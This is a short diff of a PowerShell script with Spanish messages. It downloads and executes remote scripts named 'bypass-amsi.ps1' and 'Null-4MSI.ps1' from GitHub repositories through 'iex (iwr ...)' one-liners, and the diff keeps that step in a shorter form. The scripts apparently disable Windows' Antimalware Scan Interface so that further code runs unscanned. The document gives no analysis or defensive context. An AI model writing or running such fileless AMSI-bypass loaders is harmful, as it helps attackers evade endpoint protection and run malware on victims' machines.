@@ -1,8 +1,7 @@
 try {
-    $scriptContent = Invoke-WebRequest -Uri "https://github.com/tu-usuario/tu-repo/raw/main/bypass-amsi.ps1" -UseBasicParsing
-    Invoke-Expression $scriptContent.Content
+    iex (iwr -UseBasicParsing "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/bypass-amsi.ps1")
 } catch {
-    Write-Verbose "Error ejecutando script: $_"
+    Write-Verbose "Error ejecutando bypass-amsi: $_"
 }
 try {
     iex (iwr -UseBasicParsing "https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/Null-4MSI.ps1")
